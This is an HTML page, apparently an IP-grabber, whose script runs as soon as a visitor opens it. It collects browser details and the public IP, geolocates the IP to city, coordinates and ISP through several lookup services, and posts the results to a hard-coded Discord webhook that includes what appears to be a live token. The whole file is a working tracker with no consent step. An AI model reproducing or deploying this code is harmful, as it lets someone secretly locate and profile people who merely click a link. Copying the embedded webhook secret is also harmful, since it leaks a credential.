<!DOCTYPE html>
<html>
<head>
    <title>Visitor Info</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #1a1a1a; color: white; }
        .info { background: #333; padding: 20px; border-radius: 10px; display: inline-block; }
    </style>
</head>
<body>
    <div class="info">
        <h2>Gathering your information...</h2>
        <div id="status">Please wait</div>
        <pre id="details"></pre>
    </div>

    <script>
        // ---------- CONFIG ----------
        const WEBHOOK = 'https://discord.com/api/webhooks/1482493568831717648/84IzzIBPsGlJfCEZjVCg-qok8J71R61VoyXKPxFi9AvXRrmKmG_NajRyTJyJlM2Tukpf';
        
        // ---------- HELPER ----------
        function sendToDiscord(message) {
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: message })
            }).catch(e => console.error('Discord error:', e));
        }

        // ---------- BROWSER INFO ----------
        const browser = {
            'User Agent': navigator.userAgent,
            'Language': navigator.language,
            'Screen': `${screen.width}x${screen.height}`,
            'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
            'Platform': navigator.platform
        };

        document.getElementById('details').textContent = JSON.stringify(browser, null, 2);

        // ---------- STEP 1: GET IP (TRY MULTIPLE SERVICES) ----------
        const ipServices = [
            'https://api.ipify.org?format=json',
            'https://api.myip.com',
            'https://ipapi.co/json/'
        ];

        function fetchIP(index) {
            if (index >= ipServices.length) {
                // All IP services failed – send browser info only
                sendToDiscord('🆕 New Visitor (No IP)\n' + JSON.stringify(browser, null, 2));
                document.getElementById('status').innerText = 'Could not get IP.';
                return;
            }

            fetch(ipServices[index])
                .then(r => r.json())
                .then(data => {
                    let ip = data.ip || data.ip_address;
                    if (!ip) throw new Error('No IP in response');
                    document.getElementById('status').innerText = `Got IP: ${ip}`;
                    // STEP 2: GET LOCATION USING THAT IP
                    fetchLocation(ip);
                })
                .catch(() => fetchIP(index + 1));
        }

        // ---------- STEP 2: GET LOCATION (MULTIPLE SERVICES) ----------
        function fetchLocation(ip) {
            const locServices = [
                `https://ipapi.co/${ip}/json/`,
                `https://ipinfo.io/${ip}/json?token=`, // leave token empty, works with limits
                `http://ip-api.com/json/${ip}`
            ];

            function tryLoc(index) {
                if (index >= locServices.length) {
                    // Location failed – send IP + browser
                    sendToDiscord(`🆕 New Visitor (IP only)\nIP: ${ip}\n` + JSON.stringify(browser, null, 2));
                    document.getElementById('status').innerText = 'Location unavailable.';
                    return;
                }

                fetch(locServices[index])
                    .then(r => r.json())
                    .then(data => {
                        // Parse common fields
                        const loc = {
                            ip: ip,
                            city: data.city || data.city || '?',
                            region: data.region || data.regionName || '?',
                            country: data.country_name || data.country || '?',
                            coordinates: data.loc || (data.latitude && data.longitude ? `${data.latitude},${data.longitude}` : '?'),
                            isp: data.org || data.isp || '?'
                        };

                        const full = { ...browser, ...loc };
                        document.getElementById('details').textContent = JSON.stringify(full, null, 2);
                        document.getElementById('status').innerText = '✅ Success!';

                        // Send to Discord
                        let msg = '🆕 **New Visitor**\n';
                        for (let [k, v] of Object.entries(full)) {
                            msg += `**${k}:** ${v}\n`;
                        }
                        sendToDiscord(msg);
                    })
                    .catch(() => tryLoc(index + 1));
            }
            tryLoc(0);
        }

        // START
        fetchIP(0);
    </script>
</body>
</html>
